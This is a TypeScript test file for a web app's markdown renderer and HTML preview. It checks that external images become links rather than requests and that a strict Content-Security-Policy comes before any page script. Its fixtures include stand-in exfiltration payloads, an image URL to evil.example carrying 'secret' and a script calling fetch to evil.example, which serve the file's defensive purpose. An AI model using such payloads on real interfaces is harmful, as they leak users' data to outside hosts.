import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

// The page's own address, as in a browser.
Object.assign(globalThis, { location: new URL('http://localhost:7860/') });
const { Markdown } = await import('../src/web/components/Markdown');
const { documentFor, PREVIEW_POLICY } = await import('../src/web/components/Preview');

const html = (text: string) => renderToStaticMarkup(<Markdown text={text} />);

describe('images in a reply', () => {
  it('load only from Pelican itself: another site’s is a link, never a request', () => {
    for (const src of ['https://evil.example/a.png?d=secret', '//evil.example/a.png', 'http://127.0.0.1:9999/x.png']) {
      const out = html(`![chart](${src})`);
      expect(out).not.toMatch(/<img[^>]+evil\.example|<img[^>]+9999/);
      expect(out).toContain('chart');
    }
    expect(html('![shot](api/uploads/abc)')).toMatch(/<img[^>]+src="api\/uploads\/abc"/);
  });
});

describe('previews', () => {
  it('start with the content policy, before anything the page brings', () => {
    const page = documentFor({ kind: 'html', code: '<!DOCTYPE html><html><head><script>fetch("https://evil.example")</script></head><body>hi</body></html>' }, false);
    expect(page.indexOf('Content-Security-Policy')).toBeLessThan(page.indexOf('<script>fetch'));
    expect(page.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy"')).toBe(true);
    // Whatever comes first in the page (characters HTML reads as text, a byte-order mark, a
    // comment), the policy still comes before it, where the parser puts it in the head.
    for (const lead of ['\u00a0', '\u2028', '\ufeff', '<!-- hi -->', 'text ', '\n\t ']) {
      const doc = documentFor({ kind: 'html', code: `${lead}<!doctype html><html><head><script>fetch("https://evil.example")</script></head><body>x</body></html>` }, false);
      expect(doc.startsWith('<!doctype html>'), JSON.stringify(lead)).toBe(true);
      expect(doc.indexOf('<meta http-equiv="Content-Security-Policy"'), JSON.stringify(lead)).toBeLessThan(doc.indexOf('<script>fetch'));
      expect(doc.slice(0, doc.indexOf('<meta http-equiv="Content-Security-Policy"')), JSON.stringify(lead)).toMatch(/^(<!doctype html>|<!doctype html><html data-theme="light"><head>)$/);
    }
    expect(page).toContain('RTCPeerConnection');
    const fragment = documentFor({ kind: 'html', code: '<img src="https://evil.example/x">', widget: true }, true);
    expect(fragment.indexOf('Content-Security-Policy')).toBeLessThan(fragment.indexOf('evil.example'));
    expect(PREVIEW_POLICY).toContain("default-src 'none'");
    expect(PREVIEW_POLICY).toContain('img-src data: blob:');
    expect(PREVIEW_POLICY).not.toMatch(/connect-src[^;]*\*/);
  });
});
